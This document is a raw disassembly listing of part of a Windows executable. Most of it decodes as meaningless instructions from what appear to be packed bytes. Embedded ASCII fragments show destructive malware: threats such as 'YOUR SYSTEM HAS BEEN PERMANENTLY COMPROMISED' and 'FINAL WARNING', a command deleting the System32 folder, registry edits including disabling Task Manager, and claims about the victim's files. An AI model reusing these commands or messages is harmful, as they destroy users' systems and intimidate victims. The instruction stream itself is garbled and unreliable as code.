   14000e0f3:	92                   	xchg   %eax,%edx
   14000e0f4:	08 7f 8a             	or     %bh,-0x76(%rdi)
   14000e0f7:	2b 86 ce 54 cd 23    	sub    0x23cd54ce(%rsi),%eax
   14000e0fd:	1c c7                	sbb    $0xc7,%al
   14000e0ff:	05 bc 5e 15 e0       	add    $0xe0155ebc,%eax
   14000e104:	70 ea                	jo     0x14000e0f0
   14000e106:	53                   	push   %rbx
   14000e107:	e5 5b                	in     $0x5b,%eax
   14000e109:	c3                   	ret
   14000e10a:	7f f6                	jg     0x14000e102
   14000e10c:	83 97 f6 03 75 e7 60 	adcl   $0x60,-0x188afc0a(%rdi)
   14000e113:	9d                   	popf
   14000e114:	74 dd                	je     0x14000e0f3
   14000e116:	00 20                	add    %ah,(%rax)
   14000e118:	cc                   	int3
   14000e119:	eb d6                	jmp    0x14000e0f1
   14000e11b:	c7                   	(bad)
   14000e11c:	34 01                	xor    $0x1,%al
   14000e11e:	96                   	xchg   %eax,%esi
   14000e11f:	96                   	xchg   %eax,%esi
   14000e120:	34 82                	xor    $0x82,%al
   14000e122:	9e                   	sahf
   14000e123:	12 78 18             	adc    0x18(%rax),%bh
   14000e126:	79 d1                	jns    0x14000e0f9
   14000e128:	e3 d5                	jrcxz  0x14000e0ff
   14000e12a:	b7 94                	mov    $0x94,%bh
   14000e12c:	64 5e                	fs pop %rsi
   14000e12e:	18 48 60             	sbb    %cl,0x60(%rax)
   14000e131:	71 04                	jno    0x14000e137
   14000e133:	0f d9 4f 81          	psubusw -0x7f(%rdi),%mm1
   14000e137:	08 9b fb ba 58 ef    	or     %bl,-0x10a74505(%rbx)
   14000e13d:	14 60                	adc    $0x60,%al
   14000e13f:	47 fc                	rex.RXB cld
   14000e141:	35 5e 57 0b 26       	xor    $0x260b575e,%eax
   14000e146:	ed                   	in     (%dx),%eax
   14000e147:	e9 12 33 bc 05       	jmp    0x145bd145e
   14000e14c:	70 a7                	jo     0x14000e0f5
   14000e14e:	26 58                	es pop %rax
   14000e150:	c1 c7 22             	rol    $0x22,%edi
   14000e153:	68 83 31 01 93       	push   $0xffffffff93013183
   14000e158:	b4 6b                	mov    $0x6b,%ah
   14000e15a:	23 12                	and    (%rdx),%edx
   14000e15c:	9f                   	lahf
   14000e15d:	8c 19                	mov    %ds,(%rcx)
   14000e15f:	6a 62                	push   $0x62
   14000e161:	13 8d c1 21 9c 5e    	adc    0x5e9c21c1(%rbp),%ecx
   14000e167:	1f                   	(bad)
   14000e168:	58                   	pop    %rax
   14000e169:	f3 58                	repz pop %rax
   14000e16b:	58                   	pop    %rax
   14000e16c:	9e                   	sahf
   14000e16d:	81 39 fb 51 d1 18    	cmpl   $0x18d151fb,(%rcx)
   14000e173:	b7 48                	mov    $0x48,%bh
   14000e175:	68 2c fb 08 bf       	push   $0xffffffffbf08fb2c
   14000e17a:	3f                   	(bad)
   14000e17b:	db 80 db 70 79 18    	fildl  0x187970db(%rax)
   14000e181:	0b 3e                	or     (%rsi),%edi
   14000e183:	94                   	xchg   %eax,%esp
   14000e184:	c0 24 1e 63          	shlb   $0x63,(%rsi,%rbx,1)
   14000e188:	41                   	rex.B
   14000e189:	4c 5c                	rex.WR pop %rsp
   14000e18b:	85 f7                	test   %esi,%edi
   14000e18d:	a6                   	cmpsb  (%rdi),(%rsi)
   14000e18e:	f4                   	hlt
   14000e18f:	b7 41                	mov    $0x41,%bh
   14000e191:	14 44                	adc    $0x44,%al
   14000e193:	08 06                	or     %al,(%rsi)
   14000e195:	0c 01                	or     $0x1,%al
   14000e197:	18 66 20             	sbb    %ah,0x20(%rsi)
   14000e19a:	84 e3                	test   %ah,%bl
   14000e19c:	0f 30                	wrmsr
   14000e19e:	32 41 8d             	xor    -0x73(%rcx),%al
   14000e1a1:	a6                   	cmpsb  (%rdi),(%rsi)
   14000e1a2:	d0 7c d8 02          	sarb   $1,0x2(%rax,%rbx,8)
   14000e1a6:	08 28                	or     %ch,(%rax)
   14000e1a8:	22 c8                	and    %al,%cl
   14000e1aa:	28 ff                	sub    %bh,%bh
   14000e1ac:	44 8b 40 0c          	mov    0xc(%rax),%r8d
   14000e1b0:	cd f8                	int    $0xf8
   14000e1b2:	02 74 ee c1          	add    -0x3f(%rsi,%rbp,8),%dh
   14000e1b6:	dc c2                	fadd   %st,%st(2)
   14000e1b8:	72 08                	jb     0x14000e1c2
   14000e1ba:	03 48 d0             	add    -0x30(%rax),%ecx
   14000e1bd:	ca 8c 9b             	lret   $0x9b8c
   14000e1c0:	11 8a 72 86 a8 20    	adc    %ecx,0x20a88672(%rdx)
   14000e1c6:	c8 75 e3 3e          	enter  $0xe375,$0x3e
   14000e1ca:	55                   	push   %rbp
   14000e1cb:	b0 c3                	mov    $0xc3,%al
   14000e1cd:	78 ff                	js     0x14000e1ce
   14000e1cf:	fc                   	cld
   14000e1d0:	ce                   	(bad)
   14000e1d1:	e9 46 58 a0 1b       	jmp    0x15ba13a1c
   14000e1d6:	3e 08 77 7b          	ds or  %dh,0x7b(%rdi)
   14000e1da:	5c                   	pop    %rsp
   14000e1db:	f4                   	hlt
   14000e1dc:	2f                   	(bad)
   14000e1dd:	0c a8                	or     $0xa8,%al
   14000e1df:	85 76 d0             	test   %esi,-0x30(%rsi)
   14000e1e2:	f6 3a                	idivb  (%rdx)
   14000e1e4:	36 59                	ss pop %rcx
   14000e1e6:	e8 42 33 cd c2       	call   0x102ce152d
   14000e1eb:	83 f6 75             	xor    $0x75,%esi
   14000e1ee:	4a 2a 78 22          	rex.WX sub 0x22(%rax),%dil
   14000e1f2:	75 42                	jne    0x14000e236
   14000e1f4:	76 14                	jbe    0x14000e20a
   14000e1f6:	0b bf f8 6e e0 5c    	or     0x5ce06ef8(%rdi),%edi
   14000e1fc:	10 18                	adc    %bl,(%rax)
   14000e1fe:	10 06                	adc    %al,(%rsi)
   14000e200:	66 72 42             	data16 jb 0x14000e245
   14000e203:	8d 42 ff             	lea    -0x1(%rdx),%eax
   14000e206:	9a                   	(bad)
   14000e207:	7d 0b                	jge    0x14000e214
   14000e209:	ff 8f 7c c3 28 eb    	decl   -0x14d73c84(%rdi)
   14000e20f:	0d 1f 12 e8 fb       	or     $0xfbe8121f,%eax
   14000e214:	be c4 87 3b 78       	mov    $0x783b87c4,%esi
   14000e219:	41 b8 08 cd f2 93    	mov    $0x93f2cd08,%r8d
   14000e21f:	28 a4 41 88 f6 14 8f 	sub    %ah,-0x70eb0978(%rcx,%rax,2)
   14000e226:	89 d8                	mov    %ebx,%eax
   14000e228:	d1 df                	rcr    $1,%edi
   14000e22a:	5e                   	pop    %rsi
   14000e22b:	09 83 0d db 27 be    	or     %eax,-0x41d824f3(%rbx)
   14000e231:	69 2f 37 cf 06 19    	imul   $0x1906cf37,(%rdi),%ebp
   14000e237:	0d 15 10 4c 49       	or     $0x494c1015,%eax
   14000e23c:	41 81 38 c1 09 4e 0c 	cmpl   $0xc4e09c1,(%r8)
   14000e243:	4f                   	rex.WRXB
   14000e244:	66 41 29 ef          	sub    %bp,%r15w
   14000e248:	41 18 e1             	sbb    %spl,%r9b
   14000e24b:	dd 70 41             	fnsave 0x41(%rax)
   14000e24e:	40 2a 29             	sub    (%rcx),%bpl
   14000e251:	d1 49 30             	rorl   $1,0x30(%rcx)
   14000e254:	00 18                	add    %bl,(%rax)
   14000e256:	45 18 06             	sbb    %r8b,(%r14)
   14000e259:	fc                   	cld
   14000e25a:	e1 41                	loope  0x14000e29d
   14000e25c:	f3 3b 34 50          	repz cmp (%rax,%rdx,2),%esi
   14000e260:	36 14 92             	ss adc $0x92,%al
   14000e263:	3a d0                	cmp    %al,%dl
   14000e265:	28 66 2e             	sub    %ah,0x2e(%rsi)
   14000e268:	f3 d0 30             	repz shlb $1,(%rax)
   14000e26b:	31 3f                	xor    %edi,(%rdi)
   14000e26d:	c2 1c c1             	ret    $0xc11c
   14000e270:	3e 50                	ds push %rax
   14000e272:	c2 91 02             	ret    $0x291
   14000e275:	f2 d1 72 ac          	repnz shll $1,-0x54(%rdx)
   14000e279:	ae                   	scas   (%rdi),%al
   14000e27a:	2e 1e                	cs (bad)
   14000e27c:	20 20                	and    %ah,(%rax)
   14000e27e:	c6                   	(bad)
   14000e27f:	3c 49                	cmp    $0x49,%al
   14000e281:	09 89 c8 7a bb 21    	or     %ecx,0x21bb7ac8(%rcx)
   14000e287:	23 9f 27 ef e0 48    	and    0x48e0ef27(%rdi),%ebx
   14000e28d:	06                   	(bad)
   14000e28e:	89 c8                	mov    %ecx,%eax
   14000e290:	66 77 47             	data16 ja 0x14000e2da
   14000e293:	29 3f                	sub    %edi,(%rdi)
   14000e295:	98                   	cwtl
   14000e296:	a9 7f c0 66 41       	test   $0x4166c07f,%eax
   14000e29b:	81 49 7b 11 08 7e 4c 	orl    $0x4c7e0811,0x7b(%rcx)
   14000e2a2:	01 c2                	add    %eax,%edx
   14000e2a4:	9a                   	(bad)
   14000e2a5:	7f 81                	jg     0x14000e228
   14000e2a7:	7a 7f                	jp     0x14000e328
   14000e2a9:	91                   	xchg   %eax,%ecx
   14000e2aa:	4a 8b a6 f0 42 b1 42 	rex.WX mov 0x42b142f0(%rsi),%rsp
   14000e2b1:	02 6f 8b             	add    -0x75(%rdi),%ch
   14000e2b4:	11 82 2c 75 74 d0    	adc    %eax,-0x2f8b8ad4(%rdx)
   14000e2ba:	28 5f f6             	sub    %bl,-0xa(%rdi)
   14000e2bd:	40 8c 82 ab d7 27 20 	rex mov %es,0x2027d7ab(%rdx)
   14000e2c4:	c6                   	(bad)
   14000e2c5:	2c bd                	sub    $0xbd,%al
   14000e2c7:	5c                   	pop    %rsp
   14000e2c8:	e9 ac 41 5f e0       	jmp    0x120602479
   14000e2cd:	4f 76 d0             	rex.WRXB jbe 0x14000e2a0
   14000e2d0:	75 e8                	jne    0x14000e2ba
   14000e2d2:	31 c0                	xor    %eax,%eax
   14000e2d4:	43                   	rex.XB
   14000e2d5:	47 50                	rex.RXB push %r8
   14000e2d7:	69 0e fe fe 29 d2    	imul   $0xd229fefe,(%rsi),%ecx
   14000e2dd:	7f 48                	jg     0x14000e327
   14000e2df:	05 b7 1d 1e 7f       	add    $0x7f1e1db7,%eax
   14000e2e4:	cd 80                	int    $0x80
   14000e2e6:	89 d0                	mov    %edx,%eax
   14000e2e8:	c3                   	ret
   14000e2e9:	7f 43                	jg     0x14000e32e
   14000e2eb:	9a                   	(bad)
   14000e2ec:	7b 8f                	jnp    0x14000e27d
   14000e2ee:	cb                   	lret
   14000e2ef:	48 0f 44 d0          	cmove  %rax,%rdx
   14000e2f3:	25 83 fe 87 43       	and    $0x4387fe83,%eax
   14000e2f8:	20 e4                	and    %ah,%ah
   14000e2fa:	e9 2d f4 ea ac       	jmp    0xecebd72c
   14000e2ff:	70 2c                	jo     0x14000e32d
   14000e301:	0c 08                	or     $0x8,%al
   14000e303:	0e                   	(bad)
   14000e304:	3a 08                	cmp    (%rax),%cl
   14000e306:	54                   	push   %rsp
   14000e307:	10 7c 14 14          	adc    %bh,0x14(%rsp,%rdx,1)
   14000e30b:	18 89 4a d7 88 41    	sbb    %cl,0x4188d74a(%rcx)
   14000e311:	37                   	(bad)
   14000e312:	23 cf                	and    %edi,%ecx
   14000e314:	81 3c fe c2 42 c0 42 	cmpl   $0x42c042c2,(%rsi,%rdi,8)
   14000e31b:	50                   	push   %rax
   14000e31c:	34 41                	xor    $0x41,%al
   14000e31e:	3b 0e                	cmp    (%rsi),%ecx
   14000e320:	0c 98                	or     $0x98,%al
   14000e322:	42                   	rex.X
   14000e323:	49 10 1b             	rex.WB adc %bl,(%r11)
   14000e326:	c2 7e 7b             	ret    $0x7b7e
   14000e329:	ff                   	(bad)
   14000e32a:	3c 24                	cmp    $0x24,%al
   14000e32c:	f7 d0                	not    %eax
   14000e32e:	c1 e8 1f             	shr    $0x1f,%eax
   14000e331:	cf                   	iret
   14000e332:	9e                   	sahf
   14000e333:	1d 59 6f d0 16       	sbb    $0x16d06f59,%eax
   14000e338:	07                   	(bad)
   14000e339:	1e                   	(bad)
   14000e33a:	45 20 e2             	and    %r12b,%r10b
   14000e33d:	3b 23                	cmp    (%rbx),%esp
   14000e33f:	4d 63 43 3c          	movslq 0x3c(%r11),%r8
   14000e343:	60                   	(bad)
   14000e344:	05 1f e4 4d 01       	add    $0x14de41f,%eax
   14000e349:	d8 0e                	fmuls  (%rsi)
   14000e34b:	4c 89 c8             	mov    %r9,%rax
   14000e34e:	7f 1e                	jg     0x14000e36e
   14000e350:	1e                   	(bad)
   14000e351:	c2 87 2f             	ret    $0x2f87
   14000e354:	e9 41 8b 80 6c       	jmp    0x1ac816e9a
   14000e359:	9e                   	sahf
   14000e35a:	de 21                	fisubs (%rcx)
   14000e35c:	10 0d 0e 35 48 68    	adc    %cl,0x6848350e(%rip)        # 0x1a8491870
   14000e362:	3f                   	(bad)
   14000e363:	b0 83                	mov    $0x83,%al
   14000e365:	a3 45 74 c9 45 76 4f 	movabs %eax,0x4e3e4f7645c97445
   14000e36c:	3e 4e 
   14000e36e:	24 e0                	and    $0xe0,%al
   14000e370:	0f 7b                	(bad)
   14000e372:	22 3f                	and    (%rdi),%bh
   14000e374:	4a 0c 4d             	rex.WX or $0x4d,%al
   14000e377:	a2 1c 72 09 44 10 35 	movabs %al,0xdb8335104409721c
   14000e37e:	83 db 
   14000e380:	40 10 c0             	rex adc %al,%al
   14000e383:	72 13                	jb     0x14000e398
   14000e385:	41 10 d2             	adc    %dl,%r10b
   14000e388:	7e c6                	jle    0x14000e350
   14000e38a:	15 23 37 0c dd       	adc    $0xdd0c3723,%eax
   14000e38f:	4e a4                	rex.WRX movsb (%rsi),(%rdi)
   14000e391:	d8 eb                	fsubr  %st(3),%st
   14000e393:	0a a2 43 71 f1 3e    	or     0x3ef17143(%rdx),%ah
   14000e399:	17                   	(bad)
   14000e39a:	84 ac 04 5b db f0 fe 	test   %ch,-0x10f24a5(%rsp,%rax,1)
   14000e3a1:	76 75                	jbe    0x14000e418
   14000e3a3:	07                   	(bad)
   14000e3a4:	8b 50 0c             	mov    0xc(%rax),%edx
   14000e3a7:	ba d7 02 7f e5       	mov    $0xe57f02d7,%edx
   14000e3ac:	26 48 94             	es xchg %rax,%rsp
   14000e3af:	01 d9                	add    %ebx,%ecx
   14000e3b1:	39 f5                	cmp    %esi,%ebp
   14000e3b3:	a9 72 61 ff 51       	test   $0x51ff6172,%eax
   14000e3b8:	50                   	push   %rax
   14000e3b9:	48 3d 74 bd f6 fb    	cmp    $0xfffffffffbf6bd74,%rax
   14000e3bf:	7f 4e                	jg     0x14000e40f
   14000e3c1:	4c 24 18             	rex.WR and $0x18,%al
   14000e3c4:	72 19                	jb     0x14000e3df
   14000e3c6:	48 81 e9 1b 83 09 06 	sub    $0x609831b,%rcx
   14000e3cd:	2d 13 a7 b0 6b       	sub    $0x6bb0a713,%eax
   14000e3d2:	f8                   	clc
   14000e3d3:	3b 77 e7             	cmp    -0x19(%rdi),%esi
   14000e3d6:	ac                   	lods   (%rsi),%al
   14000e3d7:	c1 29 58             	shrl   $0x58,(%rcx)
   14000e3da:	59                   	pop    %rcx
   14000e3db:	a1 d6 50 2f 12 be 89 	movabs 0x372c89be122f50d6,%eax
   14000e3e2:	2c 37 
   14000e3e4:	c3                   	ret
   14000e3e5:	1f                   	(bad)
   14000e3e6:	bc 90 0b 19 69       	mov    $0x69190b90,%esp
   14000e3eb:	49 c9                	rex.WB leave
   14000e3ed:	59                   	pop    %rcx
   14000e3ee:	fe 8a 50 c1 5f da    	decb   -0x25a03eb0(%rdx)
   14000e3f4:	c8 48 87 05          	enter  $0x8748,$0x5
   14000e3f8:	b6 59                	mov    $0x59,%dh
   14000e3fa:	00 c0                	add    %al,%al
   14000e3fc:	35 fe da 3f 1b       	xor    $0x1b3fdafe,%eax
   14000e401:	89 cb                	mov    %ecx,%ebx
   14000e403:	fa                   	cli
   14000e404:	fc                   	cld
   14000e405:	01 46 df             	add    %eax,-0x21(%rsi)
   14000e408:	61                   	(bad)
   14000e409:	24 ea                	and    $0xea,%al
   14000e40b:	49                   	rex.WB
   14000e40c:	48 c1 e2 04          	shl    $0x4,%rdx
   14000e410:	e2 bd                	loop   0x14000e3cf
   14000e412:	64 da 51 3f          	ficoml %fs:0x3f(%rcx)
   14000e416:	90                   	nop
   14000e417:	ff 25 9a 6b 3e 0f    	jmp    *0xf3e6b9a(%rip)        # 0x14f3f4fb7
   14000e41d:	a2 0b b9 90 0b aa ba 	movabs %al,0x302bbaaa0b90b90b
   14000e424:	2b 30 
   14000e426:	00 90 c2 24 05 0c    	add    %dl,0xc0524c2(%rax)
   14000e42c:	f2 e5 76             	repnz in $0x76,%eax
   14000e42f:	0d 9f ff 01 00       	or     $0x1ff9f,%eax
   14000e434:	28 c0                	sub    %al,%al
   14000e436:	00 01                	add    %al,(%rcx)
   14000e438:	50                   	push   %rax
   14000e439:	4b 6c                	rex.WXB insb (%dx),(%rdi)
   14000e43b:	2f                   	(bad)
   14000e43c:	01 c4                	add    %eax,%esp
   14000e43e:	ff 8b 4d 0a 1f 59    	decl   0x591f0a4d(%rbx)
   14000e444:	4f 55                	rex.WRXB push %r13
   14000e446:	52                   	push   %rdx
   14000e447:	20 53 59             	and    %dl,0x59(%rbx)
   14000e44a:	53                   	push   %rbx
   14000e44b:	54                   	push   %rsp
   14000e44c:	45 7f fb             	rex.RB jg 0x14000e44a
   14000e44f:	ff 8d dc 41 53 20    	decl   0x205341dc(%rbp)
   14000e455:	42                   	rex.X
   14000e456:	45                   	rex.RB
   14000e457:	45                   	rex.RB
   14000e458:	4e 20 50 45          	rex.WRX and %r10b,0x45(%rax)
   14000e45c:	52                   	push   %rdx
   14000e45d:	4d                   	rex.WRB
   14000e45e:	41                   	rex.B
   14000e45f:	4e 10 54 4c 59       	rex.WRX adc %r10b,0x59(%rsp,%r9,2)
   14000e464:	20 43 4f             	and    %al,0x4f(%rbx)
   14000e467:	4d ff                	rex.WRB (bad)
   14000e469:	bf d9 db 50 52       	mov    $0x5250dbd9,%edi
   14000e46e:	06                   	(bad)
   14000e46f:	49 53                	rex.WB push %r11
   14000e471:	45                   	rex.RB
   14000e472:	44 38 1c 57          	cmp    %r11b,(%rdi,%rdx,2)
   14000e476:	48                   	rex.W
   14000e477:	4f 2d 41 4d 2d 49    	rex.WRXB sub $0x492d4d41,%rax
   14000e47d:	2d 34 30 34 00       	sub    $0x343034,%eax
   14000e482:	46 b5 ff             	rex.RX mov $0xff,%bpl
   14000e485:	ed                   	in     (%dx),%eax
   14000e486:	f6 49 4e 41          	testb  $0x41,0x4e(%rcx)
   14000e48a:	4c 24 41             	rex.WR and $0x41,%al
   14000e48d:	52                   	push   %rdx
   14000e48e:	4e 10 47 00          	rex.WRX adc %r8b,0x0(%rdi)
   14000e492:	72 6d                	jb     0x14000e501
   14000e494:	64 69 72 20 2f 73 04 	imul   $0x7104732f,%fs:0x20(%rdx),%esi
   14000e49b:	71 
   14000e49c:	fd                   	std
   14000e49d:	ff                   	(bad)
   14000e49e:	ff                   	(bad)
   14000e49f:	bf 6a 3a 5c 57       	mov    $0x575c3a6a,%edi
   14000e4a4:	69 6e 64 6f 77 73 5c 	imul   $0x5c73776f,0x64(%rsi),%ebp
   14000e4ab:	53                   	push   %rbx
   14000e4ac:	79 73                	jns    0x14000e521
   14000e4ae:	74 65                	je     0x14000e515
   14000e4b0:	6d                   	insl   (%dx),(%rdi)
   14000e4b1:	33 32                	xor    (%rdx),%esi
   14000e4b3:	20 32                	and    %dh,(%rdx)
   14000e4b5:	3e 6e                	ds outsb (%rsi),(%dx)
   14000e4b7:	75 6c                	jne    0x14000e525
   14000e4b9:	00 64 65 6c          	add    %ah,0x6c(%rbp,%riz,2)
   14000e4bd:	ad                   	lods   (%rsi),%eax
   14000e4be:	fd                   	std
   14000e4bf:	5f                   	pop    %rdi
   14000e4c0:	ac                   	lods   (%rsi),%al
   14000e4c1:	40                   	rex
   14000e4c2:	66 47                	data16 rex.RXB
   14000e4c4:	65 78 70             	gs js  0x14000e537
   14000e4c7:	6c                   	insb   (%dx),(%rdi)
   14000e4c8:	6f                   	outsl  (%rsi),(%dx)
   14000e4c9:	72 65                	jb     0x14000e530
   14000e4cb:	72 2e                	jb     0x14000e4fb
   14000e4cd:	10 65 4f             	adc    %ah,0x4f(%rbp)
   14000e4d0:	ff 6e ff             	ljmp   *-0x1(%rsi)
   14000e4d3:	b7 1a                	mov    $0x1a,%bh
   14000e4d5:	67 20 61 64          	and    %ah,0x64(%ecx)
   14000e4d9:	64 20 22             	and    %ah,%fs:(%rdx)
   14000e4dc:	48                   	rex.W
   14000e4dd:	4b                   	rex.WXB
   14000e4de:	4c                   	rex.WR
   14000e4df:	4d 88 4f 46          	rex.WRB mov %r9b,0x46(%r15)
   14000e4e3:	54                   	push   %rsp
   14000e4e4:	ce                   	(bad)
   14000e4e5:	45 5c                	rex.RB pop %r12
   14000e4e7:	4d 69 63 db 0b 86 fd 	imul   $0x72fd860b,-0x25(%r11),%r12
   14000e4ee:	72 
   14000e4ef:	6f                   	outsl  (%rsi),(%dx)
   14000e4f0:	73 6f                	jae    0x14000e561
   14000e4f2:	66 74 77             	data16 je 0x14000e56c
   14000e4f5:	20 4a 5c             	and    %cl,0x5c(%rdx)
   14000e4f8:	43 75 72             	rex.XB jne 0x14000e56d
   14000e4fb:	5c                   	pop    %rsp
   14000e4fc:	6e                   	outsb  (%rsi),(%dx)
   14000e4fd:	74 68                	je     0x14000e567
   14000e4ff:	ad                   	lods   (%rsi),%eax
   14000e500:	b9 b7 56 80 73       	mov    $0x738056b7,%ecx
   14000e505:	69 6f 6e 33 9a 67 10 	imul   $0x10679a33,0x6e(%rdi),%ebp
   14000e50c:	22 ca                	and    %dl,%cl
   14000e50e:	76 cf                	jbe    0x14000e4df
   14000e510:	de 3e                	fidivrs (%rsi)
   14000e512:	2b b6 68 e0 e2 74    	sub    0x74e2e068(%rsi),%esi
   14000e518:	20 78 47             	and    %bh,0x47(%rax)
   14000e51b:	5f                   	pop    %rdi
   14000e51c:	53                   	push   %rbx
   14000e51d:	5a                   	pop    %rdx
   14000e51e:	12 a4 63 c0 f0 ff 04 	adc    0x4fff0c0(%rbx,%riz,2),%ah
   14000e525:	52                   	push   %rdx
   14000e526:	d3 2f                	shrl   %cl,(%rdi)
   14000e528:	63 20                	movsxd (%rax),%esp
   14000e52a:	65 63 68 6f          	movsxd %gs:0x6f(%rax),%ebp
   14000e52e:	20 09                	and    %cl,(%rcx)
   14000e530:	ad                   	lods   (%rsi),%eax
   14000e531:	82                   	(bad)
   14000e532:	02 7b 44             	add    0x44(%rbx),%bh
   14000e535:	45 1e                	rex.RB (bad)
   14000e537:	f0 59                	lock pop %rcx
   14000e539:	ed                   	in     (%dx),%eax
   14000e53a:	3e 6b c8 de          	ds imul $0xffffffde,%eax,%ecx
   14000e53e:	67 2e 20 26          	cs and %ah,(%esi)
   14000e542:	26 79 02             	es jns 0x14000e547
   14000e545:	4c 81 44 41 54 41 da 	rex.WR addq $0x1816da41,0x54(%rcx,%rax,2)
   14000e54c:	16 18 
   14000e54e:	d2 7d 6f             	sarb   %cl,0x6f(%rbp)
   14000e551:	55                   	push   %rbp
   14000e552:	67 db 02             	fildl  (%edx)
   14000e555:	db 70 54             	(bad) 0x54(%rax)
   14000e558:	48 c2 45 20          	rex.W ret $0x2045
   14000e55c:	36 78 4f             	ss js  0x14000e5ae
   14000e55f:	20 cc                	and    %cl,%ah
   14000e561:	43                   	rex.XB
   14000e562:	41 ce                	rex.B (bad)
   14000e564:	0c b6                	or     $0xb6,%al
   14000e566:	d8 50 45             	fcoms  0x45(%rax)
   14000e569:	a9 3a a2 fc b4       	test   $0xb4fca23a,%eax
   14000e56e:	7b 61                	jnp    0x14000e5d1
   14000e570:	cf                   	iret
   14000e571:	dd a6 49 4f 4e 53    	frstor 0x534e4f49(%rsi)
   14000e577:	c5 14 22             	(bad)
   14000e57a:	4f 50                	rex.WRXB push %r8
   14000e57c:	27                   	(bad)
   14000e57d:	81 e1 e0 df 54 70    	and    $0x7054dfe0,%ecx
   14000e583:	61                   	(bad)
   14000e584:	75 73                	jne    0x14000e5f9
   14000e586:	65 ca 66 5b          	gs lret $0x5b66
   14000e58a:	d4                   	(bad)
   14000e58b:	60                   	(bad)
   14000e58c:	1f                   	(bad)
   14000e58d:	cc                   	int3
   14000e58e:	43 55                	rex.XB push %r13
   14000e590:	3e 77 61             	ja,pt  0x14000e5f4
   14000e593:	26 5b                	es pop %rbx
   14000e595:	28 b6 87 86 55 50    	sub    %dh,0x50558687(%rsi)
   14000e59b:	6f                   	outsl  (%rsi),(%dx)
   14000e59c:	6c                   	insb   (%dx),(%rdi)
   14000e59d:	44 69 65 4b 0c ff ff 	imul   $0x43ffff0c,0x4b(%rbp),%r12d
   14000e5a4:	43 
   14000e5a5:	63 44 69 73          	movsxd 0x73(%rcx,%rbp,2),%eax
   14000e5a9:	61                   	(bad)
   14000e5aa:	62 6c 65 54 61       	(bad)
   14000e5af:	73 6b                	jae    0x14000e61c
   14000e5b1:	4d                   	rex.WRB
   14000e5b2:	67 72 75             	addr32 jb 0x14000e62a
   14000e5b5:	05 b1 0e 3f 44       	add    $0x443f0eb1,%eax
   14000e5ba:	57                   	push   %rdi
   14000e5bb:	4f 52                	rex.WRXB push %r10
   14000e5bd:	44 7b 31             	rex.R jnp 0x14000e5f1
   14000e5c0:	df 09                	fisttps (%rcx)
   14000e5c2:	d6                   	udb
   14000e5c3:	be d9 52 a4 10       	mov    $0x10a452d9,%esi
   14000e5c8:	74 72                	je     0x14000e63c
   14000e5ca:	79 54                	jns    0x14000e620
   14000e5cc:	6f                   	outsl  (%rsi),(%dx)
   14000e5cd:	46 73 eb             	rex.RX jae 0x14000e5bb
   14000e5d0:	d6                   	udb
   14000e5d1:	9e                   	sahf
   14000e5d2:	0e                   	(bad)
   14000e5d3:	c7                   	(bad)
   14000e5d4:	62 63 7a c6 74       	(bad) {%k6}{z}
   14000e5d9:	65 08 7b 16          	or     %bh,%gs:0x16(%rbx)
   14000e5dd:	0d 5b fb 82 66       	or     $0x6682fb5b,%eax
   14000e5e2:	fe                   	(bad)
   14000e5e3:	6c                   	insb   (%dx),(%rdi)
   14000e5e4:	74 7d                	je     0x14000e663
   14000e5e6:	20 62 62             	and    %ah,0x62(%rdx)
   14000e5e9:	74 72                	je     0x14000e65d
   14000e5eb:	61                   	(bad)
   14000e5ec:	74 18                	je     0x14000e606
   14000e5ee:	70 36                	jo     0x14000e626
   14000e5f0:	c5 c7 77             	(bad)
   14000e5f3:	bd 79 20 69 67       	mov    $0x67692079,%ebp
   14000e5f8:	6e                   	outsb  (%rsi),(%dx)
   14000e5f9:	9a                   	(bad)
   14000e5fa:	61                   	(bad)
   14000e5fb:	ee                   	out    %al,(%dx)
   14000e5fc:	40 69 6c b8 85 98 09 	rex imul $0xdc000998,-0x7b(%rax,%rdi,4),%ebp
   14000e603:	00 dc 
   14000e605:	73 34                	jae    0x14000e63b
   14000e607:	63 6f 76             	movsxd 0x76(%rdi),%ebp
   14000e60a:	6e                   	outsb  (%rsi),(%dx)
   14000e60b:	66 20 28             	data16 and %ch,(%rax)
   14000e60e:	34 79                	xor    $0x79,%al
   14000e610:	42 03 ca             	rex.X add %edx,%ecx
   14000e613:	6c                   	insb   (%dx),(%rdi)
   14000e614:	00 76 73             	add    %dh,0x73(%rsi)
   14000e617:	c3                   	ret
   14000e618:	46 05 0b 1a 64 6d    	rex.RX add $0x6d641a0b,%eax
   14000e61e:	7a 20                	jp     0x14000e640
   14000e620:	50                   	push   %rax
   14000e621:	56                   	push   %rsi
   14000e622:	c1 d1 fd             	rcl    $0xfd,%ecx
   14000e625:	b8 46 73 68 61       	mov    $0x61687346,%eax
   14000e62a:	cd 2f                	int    $0x2f
   14000e62c:	9c                   	pushf
   14000e62d:	6a 75                	push   $0x75
   14000e62f:	78 1d                	js     0x14000e64e
   14000e631:	66 07                	data16 (bad)
   14000e633:	7b 74                	jnp    0x14000e6a9
   14000e635:	00 77 62             	add    %dh,0x62(%rdi)
   14000e638:	45 63 f4             	movsxd %r12d,%r14d
   14000e63b:	38 e0                	cmp    %ah,%al
   14000e63d:	20 36                	and    %dh,(%rsi)
   14000e63f:	ec                   	in     (%dx),%al
   14000e640:	d5 b2 2d 3b          	{rex2 0xb2} cvtps2pi (%r19),%mm7
   14000e644:	01 28                	add    %ebp,(%rax)
   14000e646:	f0 13 02             	lock adc (%rdx),%eax
   14000e649:	33 0a                	xor    (%rdx),%ecx
   14000e64b:	a0 62 2c 47 14 28 22 	movabs 0x1b6222814472c62,%al
   14000e652:	b6 01 
   14000e654:	a4                   	movsb  (%rsi),(%rdi)
   14000e655:	bf 07 88 d5 54       	mov    $0x54d58807,%edi
   14000e65a:	41                   	rex.B
   14000e65b:	4b 0a 4f 56          	rex.WXB or 0x56(%r15),%cl
   14000e65f:	45 52                	rex.RB push %r10
   14000e661:	0b f4                	or     %esp,%esi
   14000e663:	ff 50 d7             	call   *-0x29(%rax)
   14000e666:	43 52                	rex.XB push %r10
   14000e668:	49 54                	rex.WB push %r12
   14000e66a:	49                   	rex.WB
   14000e66b:	43                   	rex.XB
   14000e66c:	41                   	rex.B
   14000e66d:	4c 3a 20             	rex.WR cmp (%rax),%r12b
   14000e670:	41 fe                	rex.B (bad)
   14000e672:	79 6f                	jns    0x14000e6e3
   14000e674:	ff 5f a1             	lcall  *-0x5f(%rdi)
   14000e677:	ff 75 72             	push   0x72(%rbp)
   14000e67a:	20 66 69             	and    %ah,0x69(%rsi)
   14000e67d:	6c                   	insb   (%dx),(%rdi)
   14000e67e:	65 73 20             	gs jae 0x14000e6a1
